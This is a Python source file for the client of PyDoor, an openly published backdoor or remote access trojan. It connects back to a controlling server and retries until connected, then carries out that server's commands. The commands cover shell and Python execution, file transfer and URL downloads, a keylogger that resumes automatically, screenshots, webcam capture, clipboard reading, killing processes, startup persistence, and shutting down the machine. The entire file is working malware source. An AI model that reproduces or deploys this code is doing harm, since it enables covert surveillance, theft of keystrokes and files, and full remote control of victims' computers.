"""
https://github.com/Y4hL/PyDoor

Author(s): Y4hL

License: [gpl-3.0](https://www.gnu.org/licenses/gpl-3.0.html)
"""
import os
import sys
import time
import json
import getpass
import logging
import socket
import shutil
import platform
import subprocess
from pydoc import help
from zipfile import ZipFile

from psutil import AccessDenied

from utils.process import kill, ps
from utils.errors import errors
from utils.esocket import ESocket
from utils.file import reverse_readline

from modules import web
from modules import screen
from modules import webcam
from modules import pyshell
from modules import keylogger
from modules import clipboard
from modules import persistance


if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))

os.chdir(CLIENT_PATH)
LOG = os.path.join(CLIENT_PATH, 'log.log')

if platform.system() == 'Windows':
    import ctypes


logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


class Client(object):
    """ Client Object """

    # ESocket
    esock = None
    sock = socket.socket()

    def __init__(self) -> None:

        # Try to run keylogger
        self.keylogger = keylogger.Keylogger()
        if self.keylogger.runnable:
            try:
                for line in reverse_readline(LOG):
                    if 'Started Keylogger' in line:
                        self.keylogger.start()
                        break
                    if 'Stopped Keylogger' in line:
                        break
            except Exception:
                logging.error('error reading log')

        if platform.system() == 'Windows':
            self._pwd = ' && cd'
        else:
            self._pwd = ' && pwd'

    def connect(self, address) -> None:
        """ Connect to a remote socket """
        try:
            self.sock.connect(address)
        except (ConnectionRefusedError, TimeoutError):
            raise
        except OSError as error:
            # Usually raised when socket is already connected
            # Close socket -> Reconnect
            logging.error('%s: Attempting reconnect' % str(error))
            self.sock.close()
            self.sock = socket.socket()
            raise
        except Exception as error:
            logging.error(errors(error))
            raise
        logging.info('Connected to server: %s' % (str(address)))
        self.esock = ESocket(self.sock)
        try:
            self.esock.send(socket.gethostname().encode())
        except socket.error as error:
            logging.error(errors(error))
        self.address = address

    def send_json(self, data) -> None:
        """ Send JSON data to Server """
        self.esock.send(json.dumps(data).encode())

    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
        """ Send file to Server """
        # returns None
        try:
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        break
                    self.esock.send(block)

        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), '1')
            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
        else:
            self.esock.send(b'FILE_TRANSFER_DONE', '9')
            logging.info('Transferred %s to Server', file_to_transfer)

    def receive_file(self, save_as: str) -> None:
        """ Receive File from Server"""
        # returns None

        try:
            with open(save_as, 'wb') as file:
                self.esock.send(b'Successfully opened file.')
                while True:
                    _, data = self.esock.recv()
                    if data == b'FILE_TRANSFER_DONE':
                        break
                    file.write(data)

        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), error='1')
            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
        else:
            logging.info('Transferred %s to Client', save_as)

    def receive_commands(self) -> None:
        """ Receives Commands from Server """
        while True:
            error, msg = self.esock.recv()
            data = json.loads(msg.decode())

            if data[0] == 'GETCWD':
                self.esock.send(os.getcwdb())
                continue

            if data[0] == 'LIST':
                continue

            if data[0] == 'PLATFORM':
                self.esock.send(platform.system().encode())
                continue

            if data[0] == 'LOG_FILE':
                self.esock.send(LOG.encode())
                continue

            if data[0] == '_INFO':
                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
                continue

            if data[0] == 'FROZEN':
                self.send_json(getattr(sys, 'frozen', False))
                continue

            if data[0] == 'PS':
                self.send_json(ps())
                continue

            if data[0] == 'KILL':
                try:
                    kill(data[1])
                except AccessDenied:
                    self.esock.send(b'Access Denied', '1')
                else:
                    self.esock.send(b'Killed')
                continue

            if data[0] == 'EXEC':
                output, error = pyshell.pyshell(data[1])
                self.send_json([output, error])
                continue

            if data[0] == 'RESTART_SESSION':
                self.send_json(True)
                logging.info('Restarting session')
                break

            if data[0] == 'CLOSE':
                try:
                    self.send_json(True)
                    logging.info('Closing connection and exiting')
                    self.esock.close()
                except Exception:
                    pass
                sys.exit(0)

            if data[0] == 'ADD_STARTUP':
                self.send_json(persistance.add_startup())
                continue

            if data[0] == 'REMOVE_STARTUP':
                self.send_json(persistance.remove_startup())
                continue

            if data[0] == 'LOCK':
                if platform.system() == 'Windows':
                    self.send_json(True)
                    ctypes.windll.user32.LockWorkStation()
                    logging.info('Locked workstation')
                else:
                    self.send_json(False)
                continue

            if data[0] == 'SHUTDOWN':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Shutting down system')
                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RESTART':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Restarting system')
                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue

            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue

            if data[0] == 'ZIP_FILE':
                try:
                    with ZipFile(data[1], 'w') as ziph:
                        ziph.write(data[2])
                except Exception as err:
                    logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(err))
                else:
                    logging.info('Zipped file %s into %s' % (data[2], data[1]))
                    self.send_json(None)
                continue

            if data[0] == 'ZIP_DIR':
                logging.info('Zipping Folder: %s', data[2])
                try:
                    shutil.make_archive(data[1], 'zip', data[2])
                except Exception as error:
                    logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(error))
                else:
                    logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
                    self.send_json(None)
                continue

            if data[0] == 'UNZIP':
                try:
                    with ZipFile(data[1], 'r') as ziph:
                        ziph.extractall()
                except Exception as error:
                    logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
                    self.send_json(errors(error))
                else:
                    logging.info('Unzipped %s' % data[1])
                    self.send_json(None)
                continue

            if data[0] == 'DOWNLOAD':
                error = web.download(data[1], data[2])
                if error:
                    self.send_json(error)
                else:
                    self.send_json(None)
                continue

            if data[0] == 'INFO':
                self.esock.send(f'User: {getpass.getuser()}\n' \
                    f'OS: {platform.system()} {platform.release()} ' \
                    f'({platform.platform()}) ({platform.machine()})\n' \
                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                continue

            if data[0] == 'SCREENSHOT':
                success, content = screen.screenshot()
                if success:
                    self.esock.send(content)
                else:
                    self.esock.send(content, '1')
                continue

            if data[0] == 'WEBCAM':
                image = webcam.capture_webcam()
                if image:
                    self.esock.send(image)
                else:
                    self.esock.send(b'ERROR', '1')
                continue

            if data[0] == 'START_KEYLOGGER':
                self.send_json(self.keylogger.start())
                continue

            if data[0] == 'KEYLOGGER_STATUS':
                self.send_json(self.keylogger.state())

            if data[0] == 'STOP_KEYLOGGER':
                self.send_json(self.keylogger.stop())
                continue

            if data[0] == 'COPY':
                self.send_json(clipboard.copy(data[1]))
                continue

            if data[0] == 'PASTE':
                self.send_json(clipboard.paste())
                continue

            if data[0] == 'SHELL':

                execute = lambda command: subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                split_command = data[1].split(' ')[0].strip().lower()

                if split_command in ['cd', 'chdir']:
                    process = execute(data[1] + self._pwd)
                    error = process.stderr.read().decode()
                    if error:
                        self.send_json(['ERROR', error])
                        continue
                    output = process.stdout.read().decode()
                    # Command should only return one line (cwd)
                    if output.count('\n') > 1:
                        self.send_json(['ERROR', output])
                        continue
                    os.chdir(output.strip())
                    self.send_json([os.getcwd()])
                    continue

                process = execute(data[1])
                for line in iter(process.stdout.readline, ''):
                    if line == b'':
                        break
                    self.esock.send(line.replace(b'\n', b''))
                    if self.esock.recv()[1] == b'QUIT':
                        kill(process.pid)
                        break
                self.esock.send(process.stderr.read())
                self.esock.recv()
                self.esock.send(b'DONE', '1')
                continue


def main(address: tuple, retry_timer: int = 10) -> None:
    """ Run Client """
    # RETRY_TIMER: Time to wait before trying to reconnect
    client = Client()
    logging.info('Starting connection loop')
    while True:
        try:
            client.connect(address)
        except Exception as error:
            print(error)
            time.sleep(retry_timer)
        else:
            break
    try:
        client.receive_commands()
    except Exception as error:
        logging.critical(errors(error))


if __name__ == '__main__':

    # Add Client to Startup when Client is run
    # add_startup()
    while True:
        main(('', 8001))
